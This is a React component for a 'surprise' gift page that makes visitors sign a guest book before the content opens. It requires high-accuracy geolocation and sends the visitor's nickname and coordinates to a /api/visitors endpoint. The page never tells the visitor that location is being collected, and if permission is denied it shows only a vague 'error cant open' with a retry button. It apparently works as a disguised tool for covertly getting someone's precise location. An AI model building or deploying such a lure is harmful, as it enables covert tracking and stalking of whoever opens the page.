import React, { useState } from 'react';
import { motion } from 'motion/react';
import { AlertCircle, AlertTriangle, RefreshCw } from 'lucide-react';
import { useLocation } from '../hooks/useLocation';

interface VisitorGateProps {
  onDone: () => void;
}

export default function VisitorGate({ onDone }: VisitorGateProps) {
  const [nickname, setNickname] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [formError, setFormError] = useState('');

  const {
    location,
    loading: locating,
    errorType,
    retry,
  } = useLocation({
    autoStart: true,
    enableHighAccuracy: true,
    maximumAge: 10000,
    timeout: 15000,
    minDistanceChangeMeters: 5,
    accuracyThresholdMeters: 5000,
  });

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setFormError('');

    const trimmedNickname = nickname.trim();

    if (!trimmedNickname) {
      setFormError('Please enter your nickname to continue.');
      return;
    }

    if (!location) {
      setFormError(
        'Location permission is required to continue. Please allow location access and try again.'
      );
      return;
    }

    if (submitting) return;

    setSubmitting(true);

    const payload = {
      nickname: trimmedNickname,
      latitude: location.latitude,
      longitude: location.longitude,
      accuracy: location.accuracy,
      timestamp: location.timestamp || new Date().toISOString(),
    };

    try {
      const res = await fetch('/api/visitors', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      const body = await res.json().catch(() => ({}));

      if (!res.ok) {
        setFormError(
          body?.error || 'Server rejected registration. Please try again.'
        );
        return;
      }

      sessionStorage.setItem('visitor_registered', 'true');
      onDone();
    } catch (error) {
      console.warn('Visitor registration network error:', error);

      setFormError(
        'Unable to connect to the visitor registration service. Please verify your connection and try again.'
      );
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-6 paper-bg crumpled-effect overflow-y-auto">
      <motion.form
        onSubmit={handleSubmit}
        initial={{ scale: 0.94, opacity: 0, rotate: -2 }}
        animate={{ scale: 1, opacity: 1, rotate: -1 }}
        transition={{ duration: 0.7 }}
        className="relative max-w-md w-full bg-white p-8 md:p-10 polaroid-shadow rounded-sm border border-gray-100 flex flex-col gap-5"
      >
        {/* Decorative pin */}
        <div className="absolute -top-3 left-1/2 -translate-x-1/2 w-6 h-6 bg-crimson rounded-full shadow-inner flex items-center justify-center">
          <div className="w-1.5 h-1.5 bg-white/70 rounded-full" />
        </div>

        {/* Heading */}
        <h1 className="font-cursive text-4xl md:text-5xl text-crimson font-bold text-center leading-none mt-2">
          Before you open it ✨
        </h1>

        <p className="font-serif text-center text-on-surface-variant">
          Sign the guest book to unwrap the surprise 🎀
        </p>

        <div className="w-full h-px bg-gradient-to-r from-transparent via-kraft/40 to-transparent" />

        {/* Nickname */}
        <div className="flex flex-col gap-2">
          <label
            htmlFor="nickname"
            className="font-sans text-xs uppercase tracking-widest text-kraft font-semibold"
          >
            Enter your nickname
          </label>

          <input
            id="nickname"
            name="nickname"
            type="text"
            required
            maxLength={60}
            autoComplete="nickname"
            value={nickname}
            onChange={(e) => {
              setNickname(e.target.value);
              if (formError) setFormError('');
            }}
            placeholder="e.g. Bhaktu"
            className="font-serif text-lg px-4 py-3 bg-[#FAF0E6] border border-dashed border-kraft/60 rounded-sm outline-none focus:border-crimson focus:ring-2 focus:ring-crimson/20"
          />
        </div>

        {/* Location status - intentionally does NOT expose coordinates/address */}
        {!location && errorType === 'PERMISSION_DENIED' && (
          <div className="p-3 rounded-sm bg-rose-50 border border-rose-200 text-rose-900 font-sans text-xs flex flex-col gap-2">
            <div className="flex items-start gap-2">
              <AlertCircle className="w-4 h-4 text-crimson shrink-0 mt-0.5" />

              <div className="flex flex-col gap-0.5">
                <p className="font-semibold text-crimson">
                  error cant open
                </p>

                <p className="text-rose-800/90 leading-relaxed">
                 error cant open
                </p>
              </div>
            </div>

            <button
              type="button"
              onClick={retry}
              className="self-start flex items-center gap-1 px-2.5 py-1 text-xs font-medium text-crimson border border-crimson/30 hover:bg-crimson/10 rounded-xs transition-colors cursor-pointer"
            >
              <RefreshCw className="w-3 h-3" />
              Try again
            </button>
          </div>
        )}

        {!location &&
          (errorType === 'POSITION_UNAVAILABLE' ||
            errorType === 'TIMEOUT') && (
            <div className="p-3 rounded-sm bg-amber-50 border border-amber-200 text-amber-900 font-sans text-xs flex flex-col gap-2">
              <div className="flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-amber-700 shrink-0 mt-0.5" />

                <div className="flex flex-col gap-0.5">
                  <p className="font-semibold text-amber-900">
                    Unable to determine your location.
                  </p>

                  <p className="text-amber-800/90">
                    Please check your device location settings and try again.
                  </p>
                </div>
              </div>

              <button
                type="button"
                onClick={retry}
                className="self-start flex items-center gap-1 px-2.5 py-1 text-xs font-medium text-amber-900 border border-amber-300 hover:bg-amber-100 rounded-xs transition-colors cursor-pointer"
              >
                <RefreshCw className="w-3 h-3" />
                Retry
              </button>
            </div>
          )}

        {!location &&
          (errorType === 'UNSUPPORTED' ||
            errorType === 'INSECURE_CONTEXT') && (
            <div className="p-3 rounded-sm bg-zinc-100 border border-zinc-300 text-zinc-800 font-sans text-xs flex items-center gap-2">
              <AlertCircle className="w-4 h-4 text-zinc-600 shrink-0" />

              <span>
                {errorType === 'INSECURE_CONTEXT'
                  ? 'Location access requires a secure HTTPS connection.'
                  : 'Location access is not supported by this browser.'}
              </span>
            </div>
          )}

        {/* Optional loading state */}
        {locating && !location && (
          <div className="text-center text-xs text-gray-500 font-sans">
            Preparing your guest book entry…
          </div>
        )}

        {/* Form error */}
        {formError && (
          <p
            role="alert"
            className="font-sans text-sm text-dark-red bg-blush/30 border border-dark-red/30 rounded-sm px-3 py-2 whitespace-pre-line"
          >
            {formError}
          </p>
        )}

        {/* Submit */}
        <button
          type="submit"
          disabled={
            submitting ||
            locating ||
            !nickname.trim() ||
            !location
          }
          className="font-cursive text-2xl bg-radial from-[#C41E3A] to-[#8B0000] text-cream font-bold py-3 rounded-sm shadow-lg disabled:opacity-60 disabled:cursor-not-allowed cursor-pointer transition-transform duration-200 hover:scale-[1.01]"
        >
          {submitting ? 'Please wait…' : 'Continue'}
        </button>
      </motion.form>
    </div>
  );
}
